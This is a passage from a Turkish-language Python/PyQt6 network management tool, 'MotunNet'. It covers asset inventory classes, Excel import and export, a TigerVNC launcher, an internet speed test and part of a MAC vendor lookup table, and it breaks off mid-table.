#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MotunNet v10.2 - Ultimate Network Management Suite
TÜM ÖZELLİKLER: VNC, Hız Testi, Birim/Varlık Yönetimi, Cyberpunk Radar, Excel Import,
                Canlı Monitoring, Port Tarayıcı, Uptime Grafiği, Ağ Haritası,
                Rogue Device Detector, ARP Spoofing Tespiti, Güvenlik Modülü
"""
import sys,os,socket,struct,subprocess,json,csv,time,math,platform,re,random,urllib.request,uuid
from datetime import datetime,timedelta
from collections import deque
from concurrent.futures import ThreadPoolExecutor,as_completed
import sqlite3
from dataclasses import dataclass,field,asdict

from typing import List,Dict,Optional,Tuple
from pathlib import Path
from enum import Enum
from PyQt6.QtWidgets import *
from PyQt6.QtCore import Qt,QTimer,QThread,pyqtSignal,QRectF,QSize
from PyQt6.QtGui import *

class NumericSortItem(QTableWidgetItem):
    """IP adresi gibi sayısal sıralama gerektiren hücreler için QTableWidgetItem."""
    def __init__(self, text: str, sort_key):
        super().__init__(text)
        self._sort_key = sort_key

    def __lt__(self, other):
        try:
            return self._sort_key < other._sort_key
        except AttributeError:
            return super().__lt__(other)


if platform.system()=="Windows":
    SUBPROCESS_FLAGS=subprocess.CREATE_NO_WINDOW
    STARTUPINFO=subprocess.STARTUPINFO()
    STARTUPINFO.dwFlags|=subprocess.STARTF_USESHOWWINDOW
    STARTUPINFO.wShowWindow=subprocess.SW_HIDE
else:
    SUBPROCESS_FLAGS=0
    STARTUPINFO=None

def run_command(cmd,timeout=5):
    try:
        if platform.system()=="Windows":
            return subprocess.run(cmd,capture_output=True,text=True,timeout=timeout,creationflags=SUBPROCESS_FLAGS,startupinfo=STARTUPINFO)
        return subprocess.run(cmd,capture_output=True,text=True,timeout=timeout)
    except:return subprocess.CompletedProcess(cmd,1,"","error")

def create_app_icon():
    # Önce .ico dosyasını dene
    ico_path=Path(__file__).parent/"motunnet.ico"
    if ico_path.exists():
        return QIcon(str(ico_path))
    # Fallback: programatik ikon
    icon=QIcon()
    for size in [16,32,48,64,128]:
        pm=QPixmap(size,size);pm.fill(Qt.GlobalColor.transparent)
        p=QPainter(pm);p.setRenderHint(QPainter.RenderHint.Antialiasing)
        c,r=size//2,size//2-2
        bg=QRadialGradient(c,c,r);bg.setColorAt(0,QColor(26,26,46));bg.setColorAt(1,QColor(22,33,62))
        p.setBrush(QBrush(bg));p.setPen(QPen(QColor(15,52,96),2));p.drawEllipse(2,2,size-4,size-4)
        p.setPen(QPen(QColor(0,255,136),2));p.setBrush(Qt.BrushStyle.NoBrush);p.drawEllipse(c-r+4,c-r+4,(r-4)*2,(r-4)*2)
        p.setBrush(QBrush(QColor(0,255,136)));p.setPen(Qt.PenStyle.NoPen);p.drawEllipse(c-4,c-4,8,8)
        p.end();icon.addPixmap(pm)
    return icon

class AssetType(Enum):
    PERSON="person";COMPUTER="computer";SERVER="server";PRINTER="printer"
    ROUTER="router";ACCESS_POINT="ap";IP_CAMERA="camera";CARD_READER="card_reader"
    SENSOR="sensor";IP_PHONE="phone";PLC="plc";IOT="iot";OTHER="other"

ASSET_CONFIG={
    AssetType.PERSON:{"icon":"👤","color":"#00ff88","name":"Kişi"},
    AssetType.COMPUTER:{"icon":"💻","color":"#00d4ff","name":"Bilgisayar"},
    AssetType.SERVER:{"icon":"🖥️","color":"#9b59b6","name":"Sunucu"},
    AssetType.PRINTER:{"icon":"🖨️","color":"#3498db","name":"Yazıcı"},
    AssetType.ROUTER:{"icon":"🌐","color":"#f39c12","name":"Router/Switch"},
    AssetType.ACCESS_POINT:{"icon":"📶","color":"#1abc9c","name":"Access Point"},
    AssetType.IP_CAMERA:{"icon":"📹","color":"#e74c3c","name":"IP Kamera"},
    AssetType.CARD_READER:{"icon":"🪪","color":"#e67e22","name":"Kart Okuyucu"},
    AssetType.SENSOR:{"icon":"💡","color":"#f1c40f","name":"Sensör"},
    AssetType.IP_PHONE:{"icon":"📞","color":"#2ecc71","name":"IP Telefon"},
    AssetType.PLC:{"icon":"⚙️","color":"#95a5a6","name":"PLC/Otomasyon"},
    AssetType.IOT:{"icon":"📡","color":"#fd79a8","name":"IoT Cihaz"},
    AssetType.OTHER:{"icon":"❓","color":"#bdc3c7","name":"Diğer"},
}

@dataclass
class Department:
    id:str="";name:str="";description:str="";location:str="";color:str="#00ff88"
    def to_dict(self):return asdict(self)
    @staticmethod
    def from_dict(d):return Department(**{k:v for k,v in d.items() if k in Department.__dataclass_fields__})

@dataclass
class Asset:
    id:str="";name:str="";asset_type:str="other";department_id:str=""
    hostname:str="";mac_address:str="";ip_address:str="";location:str=""
    model:str="";serial_number:str="";notes:str="";is_critical:bool=False
    vendor:str="";open_ports:str=""  # Yeni alanlar: Vendor ve Açık Portlar
    # Etki alanı bilgileri (Hostname Taramasından)
    domain:str="";domain_source:str="";domain_confidence:str=""
    # Donanım bilgileri (Sistem Taramasından)
    os_name:str="";os_version:str="";os_build:str=""
    cpu_name:str="";cpu_cores:str="";cpu_threads:str=""
    ram_total:str="";ram_details:str=""
    gpu_name:str="";gpu_vram:str=""
    disk_info:str=""  # Eski format (uyumluluk için)
    disks:list=field(default_factory=list)  # Yeni format: [{'model':'...', 'size':'...', 'type':'...'}, ...]
    pc_manufacturer:str="";pc_model:str=""
    bios_serial:str="";last_hw_scan:str=""
    def to_dict(self):return asdict(self)
    @staticmethod
    def from_dict(d):
        asset = Asset(**{k:v for k,v in d.items() if k in Asset.__dataclass_fields__})
        # Eski disk_info'dan disks listesini oluştur (migration)
        asset.migrate_disk_info()
        return asset
    def get_type_config(self):
        try:return ASSET_CONFIG[AssetType(self.asset_type)]
        except:return ASSET_CONFIG[AssetType.OTHER]
    def migrate_disk_info(self):
        """Eski disk_info string'inden disks listesini oluştur"""
        if self.disk_info and not self.disks:
            import re
            # Format: "Model (Size) [Type]; Model (Size) [Type]"
            # Örnek: "Samsung SSD 870 EVO 500GB (465 GB) [SATA SSD]; ST1000DM003 (931 GB) [HDD]"
            parts = self.disk_info.split(';')
            for part in parts:
                part = part.strip()
                if not part:
                    continue
                # Regex: Model (Size) [Type]
                match = re.match(r'^(.+?)\s*\(([^)]+)\)\s*\[([^\]]+)\]$', part)
                if match:
                    model = match.group(1).strip()
                    size = match.group(2).strip()
                    dtype = match.group(3).strip()
                    self.disks.append({'model': model, 'size': size, 'type': dtype})
                else:
                    # Alternatif format dene
                    match2 = re.match(r'^(.+?)\s*\(([^)]+)\)$', part)
                    if match2:
                        model = match2.group(1).strip()
                        size = match2.group(2).strip()
                        self.disks.append({'model': model, 'size': size, 'type': ''})
                    elif part:
                        # Sadece model adı
                        self.disks.append({'model': part, 'size': '', 'type': ''})
    def get_disk(self, index):
        """Belirli indeksteki diski döndür"""
        if self.disks and index < len(self.disks):
            return self.disks[index]
        return None
    def get_disk_summary(self, index):
        """Belirli indeksteki disk özeti"""
        disk = self.get_disk(index)
        if disk:
            model = disk.get('model', '')
            size = disk.get('size', '')
            dtype = disk.get('type', '')
            return f"{model} ({size}) [{dtype}]" if model else f"{size} [{dtype}]"
        return ""

@dataclass
class NetworkDevice:
    ip:str;status:str="unknown";hostname:str="";mac:str="";vendor:str=""
    response_time:float=0.0;open_ports:List[int]=field(default_factory=list)
    device_type:str="unknown";last_seen:str="";vnc_available:bool=False
    vnc_port:int=5900;netbios_name:str="";detection_method:str=""
    asset_id:str="";asset_name:str="";asset_type:str=""
    department_id:str="";department_name:str="";location:str="";is_critical:bool=False
    dns_servers:str=""  # DNS sunuculari
    def to_dict(self):return asdict(self)

@dataclass
class SpeedTestResult:
    download_speed:float=0.0;upload_speed:float=0.0;ping:float=0.0;jitter:float=0.0;timestamp:str=""
    def to_dict(self):return asdict(self)

class SettingsManager:
    def __init__(self):
        self.file=Path.home()/".motunnet_v6_settings.json";self.settings=self.load()
    def load(self):
        if self.file.exists():
            try:
                with open(self.file,'r') as f:return json.load(f)
            except:pass
        return {'vnc_path':'','subnet':'','data_path':'','domain1':'','domain2':''}
    def save(self):
        with open(self.file,'w') as f:json.dump(self.settings,f,indent=2)
    def get(self,k,d=None):return self.settings.get(k,d)
    def set(self,k,v):self.settings[k]=v;self.save()

class OrganizationManager:
    def __init__(self, data_path=None):
        # Özel yol verilmişse onu kullan, yoksa varsayılan
        if data_path and data_path.strip():
            self.file = Path(data_path)
        else:
            self.file = Path.home()/".motunnet_org_v6.json"
        self.departments = {}
        self.assets = {}
        self.last_modified = 0
        self.load()
    
    def set_data_path(self, new_path):
        """Veri dosyası konumunu değiştir"""
        if new_path and new_path.strip():
            self.file = Path(new_path)
        else:
            self.file = Path.home()/".motunnet_org_v6.json"
        self.load()
    
    def check_for_updates(self):
        """Dosya değişiklik kontrolü - başkası değiştirdi mi?"""
        try:
            if self.file.exists():
                mtime = self.file.stat().st_mtime
                if mtime > self.last_modified:
                    self.load()
                    return True
        except:
            pass
        return False
    
    def load(self):
        self.departments = {}
        self.assets = {}
        if self.file.exists():
            try:
                self.last_modified = self.file.stat().st_mtime
                with open(self.file,'r',encoding='utf-8') as f:
                    data=json.load(f)
                    for d in data.get('departments',[]):
                        dept=Department.from_dict(d)
                        self.departments[dept.id]=dept
                    for a in data.get('assets',[]):
                        asset=Asset.from_dict(a)
                        self.assets[asset.id]=asset
            except Exception as e:
                print(f"Veri yükleme hatası: {e}")
    
    def save(self):
        try:
            # Klasör yoksa oluştur
            self.file.parent.mkdir(parents=True, exist_ok=True)
            data={'departments':[d.to_dict() for d in self.departments.values()],'assets':[a.to_dict() for a in self.assets.values()]}
            with open(self.file,'w',encoding='utf-8') as f:
                json.dump(data,f,indent=2,ensure_ascii=False)
            self.last_modified = self.file.stat().st_mtime
        except Exception as e:
            print(f"Veri kaydetme hatası: {e}")
    def add_department(self,name,description="",location="",color="#00ff88"):
        d=Department(id=f"dept_{int(time.time()*1000)}",name=name,description=description,location=location,color=color)
        self.departments[d.id]=d;self.save();return d
    def update_department(self,did,**kw):
        if did in self.departments:
            for k,v in kw.items():
                if hasattr(self.departments[did],k) and v is not None:setattr(self.departments[did],k,v)
            self.save()
    def delete_department(self,did):
        if did in self.departments:
            for aid in [a.id for a in self.assets.values() if a.department_id==did]:del self.assets[aid]
            del self.departments[did];self.save()
    def get_departments(self):return list(self.departments.values())
    def add_asset(self,name,asset_type,department_id,**kw):
        a=Asset(id=f"asset_{int(time.time()*1000)}_{random.randint(100,999)}",name=name,asset_type=asset_type,department_id=department_id,
                hostname=kw.get('hostname','').upper(),mac_address=kw.get('mac_address','').upper().replace("-",":"),
                ip_address=kw.get('ip_address',''),location=kw.get('location',''),model=kw.get('model',''),
                serial_number=kw.get('serial_number',''),notes=kw.get('notes',''),is_critical=kw.get('is_critical',False))
        self.assets[a.id]=a;self.save();return a
    def update_asset(self,aid,**kw):
        if aid in self.assets:
            for k,v in kw.items():
                if hasattr(self.assets[aid],k) and v is not None:
                    if k=='hostname':v=v.upper()
                    elif k=='mac_address':v=v.upper().replace("-",":")
                    setattr(self.assets[aid],k,v)
            self.save()
    def delete_asset(self,aid):
        if aid in self.assets:del self.assets[aid];self.save()
    def get_assets(self,did=None,atype=None):
        r=list(self.assets.values())
        if did:r=[a for a in r if a.department_id==did]
        if atype:r=[a for a in r if a.asset_type==atype]
        return r
    def match_device(self,device):
        dh=(device.hostname or device.netbios_name or "").upper()
        dm=(device.mac or "").upper().replace("-",":")
        di=device.ip
        for a in self.assets.values():
            if a.hostname and dh and (a.hostname.upper() in dh or dh in a.hostname.upper()):return a,self.departments.get(a.department_id)
            if a.mac_address and dm and a.mac_address==dm:return a,self.departments.get(a.department_id)
            if a.ip_address and di and a.ip_address==di:return a,self.departments.get(a.department_id)
        return None,None
    def import_from_excel(self, path, did, atype):
        """
        Excel/CSV import — başlık satırına göre sütunları otomatik algılar.
        Desteklenen sütunlar: Ad, Hostname, MAC, IP, Konum, Model, Seri No,
                              Notlar, Vendor, Açık Portlar, Kritik
        Eski format (başlıksız 6 sütun) da geriye dönük desteklenir.
        """
        # Sütun başlığı → alan adı haritası (büyük/küçük harf duyarsız)
        HEADER_MAP = {
            "ad": "name", "name": "name",
            "hostname": "hostname",
            "mac": "mac_address", "mac adresi": "mac_address",
            "ip": "ip_address", "ip adresi": "ip_address",
            "konum": "location", "location": "location",
            "model": "model",
            "seri no": "serial_number", "serial": "serial_number",
            "notlar": "notes", "notes": "notes",
            "vendor": "vendor",
            "açık portlar": "open_ports", "portlar": "open_ports",
            "kritik": "is_critical",
        }
        imported, errors = 0, []

        def parse_row(headers, row):
            """Başlık listesine göre satırı dict'e çevir."""
            data = {}
            for ci, h in enumerate(headers):
                key = HEADER_MAP.get(h.lower().strip())
                if key and ci < len(row) and row[ci] is not None:
                    val = str(row[ci]).strip()
                    if key == "is_critical":
                        data[key] = val.lower() in ("evet", "yes", "1", "true")
                    else:
                        data[key] = val
            return data

        try:
            from openpyxl import load_workbook
            wb = load_workbook(path)
            ws = wb.active
            rows = list(ws.iter_rows(min_row=1, values_only=True))
            if not rows:
                return 0, ["Dosya boş"]

            # Başlık satırını tespit et
            first = [str(c).strip() if c else "" for c in rows[0]]
            has_headers = any(
                h.lower() in HEADER_MAP for h in first if h
            )

            if has_headers:
                headers = first
                data_rows = rows[1:]
            else:
                # Eski format: Ad, Hostname, MAC, Konum, Model, Notlar
                headers = ["Ad", "Hostname", "MAC", "Konum", "Model", "Notlar"]
                data_rows = rows[1:]  # ilk satır da başlık sayılabilir, atla

            for rn, row in enumerate(data_rows, 2):
                try:
                    if not row or not row[0]:
                        continue
                    d = parse_row(headers, row)
                    name = d.pop("name", str(row[0]).strip())
                    if not name:
                        continue
                    self.add_asset(name, atype, did, **d)
                    imported += 1
                except Exception as e:
                    errors.append(f"Satır {rn}: {e}")
            wb.close()

        except ImportError:
            # openpyxl yok, CSV dene
            try:
                with open(path, 'r', encoding='utf-8-sig') as f:
                    reader = csv.reader(f)
                    header_row = next(reader, None)
                    if not header_row:
                        return 0, ["Dosya boş"]
                    has_headers = any(
                        h.lower().strip() in HEADER_MAP
                        for h in header_row if h
                    )
                    headers = header_row if has_headers else \
                              ["Ad", "Hostname", "MAC", "Konum", "Model", "Notlar"]
                    start_rows = reader if has_headers else \
                                 ([header_row] + list(reader))
                    for rn, row in enumerate(start_rows, 2):
                        try:
                            if not row or not row[0]:
                                continue
                            d = parse_row(headers, row)
                            name = d.pop("name", row[0].strip())
                            if not name:
                                continue
                            self.add_asset(name, atype, did, **d)
                            imported += 1
                        except Exception as e:
                            errors.append(f"Satır {rn}: {e}")
            except Exception as e:
                errors.append(str(e))
        except Exception as e:
            errors.append(str(e))
        return imported, errors
    def export_to_excel(self,path,did=None,atype=None):
        """Tam kapsamlı Excel export - tüm alanlar dahil"""
        try:
            from openpyxl import Workbook
            from openpyxl.styles import Font, PatternFill, Alignment, Border, Side
            wb = Workbook()
            ws = wb.active
            ws.title = "Varlıklar"

            # ── Sütun tanımları: (başlık, getter, genişlik, grup) ───────
            # Not: Disk sütunları Asset.get_disk_summary(idx) kullanır
            COLUMNS = [
                # TEMEL BİLGİLER
                ("Ad",               lambda a,d: a.name,                                                              18, "temel"),
                ("Tür",              lambda a,d: ASSET_CONFIG.get(AssetType(a.asset_type),{}).get('name',a.asset_type),14, "temel"),
                ("Birim",            lambda a,d: d.name,                                                              18, "temel"),
                ("Konum",            lambda a,d: a.location,                                                          16, "temel"),
                ("Kritik",           lambda a,d: "Evet" if a.is_critical else "",                                      8, "temel"),
                # AĞ BİLGİLERİ
                ("Hostname",         lambda a,d: a.hostname,                                                          22, "ag"),
                ("IP Adresi",        lambda a,d: a.ip_address,                                                        16, "ag"),
                ("MAC Adresi",       lambda a,d: a.mac_address,                                                       20, "ag"),
                ("Vendor",           lambda a,d: a.vendor,                                                            28, "ag"),
                ("Açık Portlar",     lambda a,d: a.open_ports,                                                        30, "ag"),
                ("Notlar",           lambda a,d: a.notes,                                                             28, "ag"),
                # CİHAZ BİLGİLERİ
                ("Model",            lambda a,d: a.model,                                                             22, "cihaz"),
                ("Seri No",          lambda a,d: a.serial_number,                                                     18, "cihaz"),
                ("PC Üretici",       lambda a,d: a.pc_manufacturer,                                                   20, "cihaz"),
                ("PC Model",         lambda a,d: a.pc_model,                                                          25, "cihaz"),
                # DONANIM BİLGİLERİ
                ("İşletim Sistemi",  lambda a,d: a.os_name,                                                          30, "donanim"),
                ("OS Sürüm",         lambda a,d: a.os_version,                                                       16, "donanim"),
                ("CPU",              lambda a,d: a.cpu_name,                                                          35, "donanim"),
                ("CPU Çekirdek",     lambda a,d: a.cpu_cores,                                                         14, "donanim"),
                ("CPU Thread",       lambda a,d: a.cpu_threads,                                                       14, "donanim"),
                ("RAM",              lambda a,d: a.ram_total,                                                         12, "donanim"),
                ("RAM Detay",        lambda a,d: a.ram_details,                                                       25, "donanim"),
                ("GPU",              lambda a,d: a.gpu_name,                                                          30, "donanim"),
                ("GPU VRAM",         lambda a,d: a.gpu_vram,                                                          12, "donanim"),
                ("Disk 1",           lambda a,d: a.get_disk_summary(0),                                              38, "donanim"),
                ("Disk 2",           lambda a,d: a.get_disk_summary(1),                                              38, "donanim"),
                ("Disk 3",           lambda a,d: a.get_disk_summary(2),                                              38, "donanim"),
                ("BIOS Seri",        lambda a,d: a.bios_serial,                                                       20, "donanim"),
                ("Son HW Tarama",    lambda a,d: a.last_hw_scan,                                                      18, "donanim"),
            ]

            # Grup renkleri — açık tema (beyaz arka plan, koyu yazı)
            GRUP_FILL = {
                "temel":   PatternFill("solid", fgColor="1F4E79"),  # Koyu mavi
                "ag":      PatternFill("solid", fgColor="1E5E3C"),  # Koyu yeşil
                "cihaz":   PatternFill("solid", fgColor="4B0082"),  # Mor
                "donanim": PatternFill("solid", fgColor="7D3600"),  # Turuncu
            }
            GRUP_FONT_COLOR = {
                "temel": "FFFFFF", "ag": "FFFFFF",
                "cihaz": "FFFFFF", "donanim": "FFFFFF",
            }
            # Alan başlığı arka planları — gruba göre açık ton
            HDR_FILL = {
                "temel":   PatternFill("solid", fgColor="BDD7EE"),  # Açık mavi
                "ag":      PatternFill("solid", fgColor="C6EFCE"),  # Açık yeşil
                "cihaz":   PatternFill("solid", fgColor="E2C9F7"),  # Açık mor
                "donanim": PatternFill("solid", fgColor="FCE4D6"),  # Açık turuncu
            }
            HDR_FONT_COLOR = {
                "temel": "1F4E79", "ag": "1E5E3C",
                "cihaz": "4B0082", "donanim": "7D3600",
            }

            # Satır 1: Grup başlıkları (birleştirilmiş)
            grup_cols = {}
            for ci, (_, __, ___, grp) in enumerate(COLUMNS, 1):
                grup_cols.setdefault(grp, []).append(ci)

            grp_labels = {"temel":"TEMEL BİLGİLER","ag":"AĞ BİLGİLERİ","cihaz":"CİHAZ BİLGİLERİ","donanim":"DONANIM BİLGİLERİ"}
            for grp, cols in grup_cols.items():
                c_start, c_end = cols[0], cols[-1]
                cell = ws.cell(row=1, column=c_start, value=grp_labels[grp])
                cell.fill = GRUP_FILL[grp]
                cell.font = Font(color=GRUP_FONT_COLOR[grp], bold=True, size=10)
                cell.alignment = Alignment(horizontal="center", vertical="center")
                if c_start < c_end:
                    ws.merge_cells(start_row=1, start_column=c_start,
                                   end_row=1,   end_column=c_end)
            ws.row_dimensions[1].height = 18

            # Satır 2: Alan başlıkları
            thin = Side(style="thin", color="AAAAAA")
            border = Border(left=thin, right=thin, top=thin, bottom=thin)
            for ci, (header, _, col_w, grp) in enumerate(COLUMNS, 1):
                cell = ws.cell(row=2, column=ci, value=header)
                cell.fill = HDR_FILL[grp]
                cell.font = Font(color=HDR_FONT_COLOR[grp], bold=True, size=9)
                cell.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
                cell.border = border
            ws.row_dimensions[2].height = 22

            # Satır genişlikleri
            from openpyxl.utils import get_column_letter
            for ci, (_, __, col_w, ___) in enumerate(COLUMNS, 1):
                ws.column_dimensions[get_column_letter(ci)].width = col_w

            # Veriler — beyaz arka plan, siyah yazı, zebra çizgisi
            alt_fill  = PatternFill("solid", fgColor="F2F2F2")  # Açık gri (tek satır)
            norm_fill = PatternFill("solid", fgColor="FFFFFF")  # Beyaz (çift satır)
            norm_font = Font(color="1A1A1A", size=9)
            crit_font = Font(color="C00000", size=9, bold=True)  # Kritik cihaz kırmızı

            for rn, asset in enumerate(self.get_assets(did, atype), 3):
                dept = self.departments.get(asset.department_id, Department())
                is_alt   = (rn % 2 == 0)
                row_fill = alt_fill if is_alt else norm_fill
                row_font = crit_font if asset.is_critical else norm_font
                for ci, (_, getter, __, ___) in enumerate(COLUMNS, 1):
                    try:
                        val = getter(asset, dept)
                    except Exception:
                        val = ""
                    cell = ws.cell(row=rn, column=ci, value=val or "")
                    cell.fill = row_fill
                    cell.font = row_font
                    cell.border = border
                    cell.alignment = Alignment(vertical="center")

            # Başlık satırlarını dondur
            ws.freeze_panes = "A3"
            wb.save(path)
            return True, ""
        except ImportError:
            # openpyxl yoksa CSV
            csv_path = path.replace('.xlsx', '.csv')
            with open(csv_path, 'w', newline='', encoding='utf-8-sig') as f:
                w = csv.writer(f)
                w.writerow(["Ad","Tür","Birim","Konum","Kritik",
                            "Hostname","IP","MAC","Vendor","Açık Portlar","Notlar",
                            "Model","Seri No","PC Üretici","PC Model",
                            "OS","OS Sürüm","CPU","CPU Çekirdek","CPU Thread",
                            "RAM","RAM Detay","GPU","GPU VRAM",
                            "Disk 1","Disk 2","Disk 3","BIOS Seri","Son HW Tarama"])
                for a in self.get_assets(did, atype):
                    dept = self.departments.get(a.department_id, Department())
                    tname = ASSET_CONFIG.get(AssetType(a.asset_type), {}).get('name', a.asset_type)
                    w.writerow([
                        a.name, tname, dept.name, a.location, "Evet" if a.is_critical else "",
                        a.hostname, a.ip_address, a.mac_address, a.vendor, a.open_ports, a.notes,
                        a.model, a.serial_number, a.pc_manufacturer, a.pc_model,
                        a.os_name, a.os_version, a.cpu_name, a.cpu_cores, a.cpu_threads,
                        a.ram_total, a.ram_details, a.gpu_name, a.gpu_vram,
                        a.get_disk_summary(0), a.get_disk_summary(1), a.get_disk_summary(2), a.bios_serial, a.last_hw_scan
                    ])
            return True, f"CSV: {csv_path}"
        except Exception as e:
            return False, str(e)
    def get_stats(self):
        stats={'total_departments':len(self.departments),'total_assets':len(self.assets),'by_type':{}}
        for a in self.assets.values():stats['by_type'][a.asset_type]=stats['by_type'].get(a.asset_type,0)+1
        return stats

class VNCManager:
    def __init__(self,settings):
        self.settings=settings;self.path=self._find()
    def _find(self):
        s=self.settings.get('vnc_path','')
        if s and os.path.exists(s):return s
        if platform.system()=="Windows":
            for p in [r'C:\Program Files\TigerVNC\vncviewer.exe',r'C:\Program Files (x86)\TigerVNC\vncviewer.exe']:
                if os.path.exists(p):self.settings.set('vnc_path',p);return p
        return 'vncviewer'
    def connect(self,ip,port=5900):
        d=port-5900 if port>=5900 else 0
        addr=f"{ip}:{d}" if d>0 else f"{ip}::{port}"
        try:
            if platform.system()=="Windows":subprocess.Popen([self.path,addr],creationflags=subprocess.DETACHED_PROCESS)
            else:subprocess.Popen([self.path,addr],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,start_new_session=True)
            return True,f"VNC açıldı: {addr}"
        except FileNotFoundError:return False,"TigerVNC bulunamadı!\nİndir: https://tigervnc.org"
        except Exception as e:return False,str(e)

class SpeedTestThread(QThread):
    progress=pyqtSignal(str,int);result=pyqtSignal(SpeedTestResult);speed_update=pyqtSignal(float,float)  # download, upload live
    def __init__(self):super().__init__();self.running=True
    def stop(self):self.running=False
    
    def measure_download(self,url,duration=8):
        """Tek bağlantı ile download ölç"""
        total=0;start=time.time()
        try:
            req=urllib.request.Request(url)
            req.add_header('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
            req.add_header('Accept-Encoding','identity')
            with urllib.request.urlopen(req,timeout=duration+2) as resp:
                while self.running and (time.time()-start)<duration:
                    chunk=resp.read(131072)  # 128KB chunks
                    if not chunk:break
                    total+=len(chunk)
        except:pass
        return total
    
    def measure_upload(self,url,data_size=2097152,duration=8):
        """Upload ölç"""
        total=0;start=time.time()
        try:
            data=os.urandom(min(data_size,524288))  # Random data daha gerçekçi
            while self.running and (time.time()-start)<duration:
                req=urllib.request.Request(url,data=data,method='POST')
                req.add_header('Content-Type','application/octet-stream')
                req.add_header('User-Agent','Mozilla/5.0')
                try:
                    with urllib.request.urlopen(req,timeout=5) as resp:
                        resp.read()
                    total+=len(data)
                except:break
        except:pass
        elapsed=time.time()-start
        return total,elapsed
    
    def run(self):
        r=SpeedTestResult(timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        try:
            # === PING TEST ===
            self.progress.emit("🏓 Ping ölçülüyor...",5)
            pings=[]
            test_hosts=["8.8.8.8","1.1.1.1","208.67.222.222"]
            for host in test_hosts:
                if not self.running:break
                for _ in range(2):
                    cmd=["ping","-n" if platform.system()=="Windows" else "-c","1","-w" if platform.system()=="Windows" else "-W","1000" if platform.system()=="Windows" else "1",host]
                    res=run_command(cmd,3)
                    if res.returncode==0:
                        m=re.search(r'time[=<]?([\d.]+)',res.stdout)
                        if m:pings.append(float(m.group(1)))
            r.ping=sum(pings)/len(pings) if pings else 0
            r.jitter=(sum((p-r.ping)**2 for p in pings)/len(pings))**0.5 if len(pings)>1 else 0
            
            # === DOWNLOAD TEST ===
            self.progress.emit("📥 Download testi başlıyor...",15)
            
            # Farklı sunuculardan paralel indirme
            download_urls=[
                "https://speed.cloudflare.com/__down?bytes=26214400",  # 25MB
                "https://proof.ovh.net/files/10Mb.dat",
                "http://speedtest.tele2.net/10MB.zip",
            ]
            
            total_downloaded=0;download_start=time.time()
            
            # Paralel download için ThreadPoolExecutor
            with ThreadPoolExecutor(max_workers=4) as executor:
                futures=[]
                for url in download_urls:
                    if not self.running:break
                    futures.append(executor.submit(self.measure_download,url,6))
                
                # İlerleme göster
                for i,f in enumerate(as_completed(futures)):
                    if not self.running:break
                    try:
                        downloaded=f.result()
                        total_downloaded+=downloaded
                        progress=25+int((i+1)/len(futures)*25)
                        current_speed=(total_downloaded*8)/((time.time()-download_start)*1000000)
                        self.progress.emit(f"📥 Download: {current_speed:.1f} Mbps",progress)
                    except:pass
            
            download_elapsed=time.time()-download_start
            r.download_speed=(total_downloaded*8)/(download_elapsed*1000000) if download_elapsed>0.1 else 0
            
            # === UPLOAD TEST ===
            self.progress.emit("📤 Upload testi başlıyor...",55)
            
            upload_urls=[
                "https://speed.cloudflare.com/__up",
                "https://httpbin.org/post",
            ]
            
            total_uploaded=0;upload_start=time.time()
            
            # Her URL'ye upload dene
            for url in upload_urls:
                if not self.running:break
                try:
                    uploaded,elapsed=self.measure_upload(url,2097152,5)  # 2MB chunks, 5 saniye
                    total_uploaded+=uploaded
                    current_speed=(total_uploaded*8)/((time.time()-upload_start)*1000000)
                    self.progress.emit(f"📤 Upload: {current_speed:.1f} Mbps",70)
                except:pass
            
            upload_elapsed=time.time()-upload_start
            r.upload_speed=(total_uploaded*8)/(upload_elapsed*1000000) if upload_elapsed>0.1 else 0
            
            # === SONUÇ ===
            self.progress.emit(f"✅ Tamamlandı - ⬇️{r.download_speed:.1f} ⬆️{r.upload_speed:.1f} Mbps",100)
            self.result.emit(r)
            
        except Exception as e:
            self.progress.emit(f"❌ Hata: {str(e)[:30]}",100)

MAC_VENDORS={
    # Ağ Cihazları
    "00:00:0C":("Cisco","router"),"00:1A:A0":("Dell","switch"),"00:04:96":("Extreme Networks","switch"),
    "00:1B:17":("Palo Alto","firewall"),"00:50:56":("VMware","computer"),"00:0C:29":("VMware","computer"),
    "00:15:5D":("Microsoft Hyper-V","computer"),"00:1C:42":("Parallels","computer"),
    # Güvenlik Kameraları
    "00:1C:F0":("Dahua","camera"),"00:12:17":("Cisco-Linksys","camera"),"44:19:B6":("Hikvision","camera"),
    "C0:56:E3":("Hikvision","camera"),"28:57:BE":("Hikvision","camera"),"54:C4:15":("Hikvision","camera"),
    "BC:AD:28":("Hikvision","camera"),"A4:14:37":("Hikvision","camera"),"00:40:8C":("Axis","camera"),
    "AC:CC:8E":("Axis","camera"),"00:0F:7C":("ACTi","camera"),"9C:8E:CD":("Amcrest","camera"),
    "E0:50:8B":("Zhejiang Dahua","camera"),"3C:EF:8C":("Dahua","camera"),
    # Yazıcılar
    "00:00:48":("Seiko Epson","printer"),"00:1E:8F":("Canon","printer"),"00:1B:A9":("Brother","printer"),
    "00:17:08":("Hewlett Packard","printer"),"00:21:5A":("Hewlett Packard","printer"),
    "3C:D9:2B":("Hewlett Packard","printer"),"A0:D3:C1":("Hewlett Packard","printer"),
    "00:1E:0B":("Hewlett Packard","printer"),"00:25:B3":("Hewlett Packard","printer"),
    "00:1A:73":("Ricoh","printer"),"00:26:73":("Ricoh","printer"),"00:00:74":("Ricoh","printer"),
    "00:00:AA":("Xerox","printer"),"00:00:01":("Xerox","printer"),"64:D1:54":("Hewlett Packard","printer"),
    # IoT / Gömülü Sistemler
    "18:FE:34":("Espressif","iot"),"24:0A:C4":("Espressif","iot"),"5C:CF:7F":("Espressif","iot"),
    "00:17:61":("ZKTeco","card_reader"),"00:1F:C6":("ASRock","computer"),
    # Ağ Ekipmanları (Switch/Router)
    "74:FE:CE":("Cambium Networks","switch"),"58:8D:09":("Cisco Meraki","router"),
    "00:18:0A":("Cisco Meraki","router"),"88:15:44":("Cisco Meraki","switch"),
    "00:1E:BD":("Cisco","router"),"00:25:45":("Cisco","router"),"00:26:CB":("Cisco","switch"),
    "00:1D:70":("Cisco","router"),"F8:72:EA":("Cisco","switch"),"C4:71:FE":("Cisco","switch"),
    "00:1B:54":("Cisco","router"),"00:1A:2F":("Cisco","router"),"00:0D:BD":("Cisco","router"),
